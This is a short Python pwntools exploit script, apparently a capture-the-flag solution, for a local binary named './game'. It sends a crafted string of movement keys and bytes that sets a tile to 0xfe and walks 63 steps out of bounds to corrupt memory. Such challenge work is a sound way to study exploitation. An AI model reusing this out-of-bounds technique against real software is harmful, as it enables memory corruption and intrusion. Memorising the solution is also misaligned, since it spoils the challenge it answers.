from pwn import *

p = process('./game')

payload = b"aaaaaaaawwwwsp"*3    
payload += b"aaaaaaaawwwwsaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaal"
payload += b"\x70"               
payload += b"w"                  
# level 5 starts at (4,4)
payload += b"wwww"               # go up to row 0
payload += b"aaaa"               # go left to col 0
payload += b"l\xfe"             # set character to 0xfe NOW at (0,0)
payload += b"a"*63              # go 63 steps left OUT OF BOUNDS

p.sendline(payload)
output = p.recvall(timeout=3)
print(output.decode('latin-1'))
